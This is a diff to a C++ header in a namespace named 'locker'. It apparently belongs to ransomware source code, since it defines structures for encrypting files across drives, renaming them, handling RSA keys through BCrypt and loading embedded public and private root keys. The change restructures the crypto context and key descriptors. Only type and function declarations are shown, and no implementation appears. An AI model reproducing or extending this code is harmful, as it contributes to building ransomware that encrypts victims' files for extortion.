@@ -25,6 +25,7 @@ enum CryptoPolicy
 
 typedef void (*EncryptMethodFunc)(void* FileInfo, void* ctx, int64_t* padding, BYTE* buff1, BYTE* buff2, u32 bytes);
 typedef void (*EncryptGenKeyFunc)(void* ctx, BYTE* KEY, BYTE* IV);
+typedef BOOL (*EncryptAlgoMethod)(void* FileInfo);
 
 
 namespace locker
@@ -36,27 +37,39 @@ namespace locker
 		SLIST_ENTRY(HashList);
 	} *PHLIST, HLIST;
 
-	typedef struct CryptCTXInfo
+	struct descriptor
 	{
-		CONST CHAR* name;
+		BYTE* key_data;
+		WCHAR* rsa_path;
+		DWORD size;
+		BCRYPT_ALG_HANDLE crypto_provider;
+		BCRYPT_KEY_HANDLE handle_rsa_key;
+	};
+
+	typedef struct CryptCTXInfo
+	{		
 		VOID* ctx;
-		int64_t	padding;
+		descriptor desc;
+		CONST CHAR* name;		
 		u32 mode;
 		CryptoPolicy method_policy;
 		GenPolicy gen_policy;
 		EncryptMethodFunc crypt_method;
 		EncryptGenKeyFunc gen_key_method;
+		EncryptAlgoMethod algo_method;
 	} CRYPT_INFO, * PCRYPT_INFO;
 
 	typedef struct file_info
 	{
+		VOID* ctx;
 		PCRYPT_INFO CryptInfo;
 		LPCWSTR Filename;
 		WCHAR* newFilename;
 		LPCWSTR FilePath;
 		HANDLE FileHandle;
 		HANDLE newFileHandle;
-		LONGLONG Filesize;		
+		LONGLONG Filesize;
+		int64_t	padding;
 	}FILE_INFO, * PFILE_INFO;
 	
 	typedef struct CryptoSystem
@@ -68,12 +81,11 @@ namespace locker
 	}CRYPTO_SYSTEM;
 
 	
-
-	CRYPT_INFO* GeneratePolicy(CRYPTO_SYSTEM* sys);
+	VOID FreeCryptInfo(CRYPT_INFO* CryptInfo);
+	BOOL GeneratePolicy(CRYPT_INFO* CryptInfo);
 	VOID CryptoSystemInit(CRYPTO_SYSTEM* sys);
 
 	BOOL HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data, SLIST<HLIST>* HashList);
-	BOOL HandlerGenKeyPairRSA();
 
 	VOID LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
 	VOID LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
@@ -87,7 +99,6 @@ typedef locker::PFILE_INFO PFILE_INFO;
 typedef locker::CryptCTXInfo CRYPT_INFO;
 typedef locker::FILE_INFO FILE_INFO;
 typedef locker::CryptoSystem CRYPTO_SYSTEM;
-
-
+typedef locker::HLIST HLIST;
 
 #endif
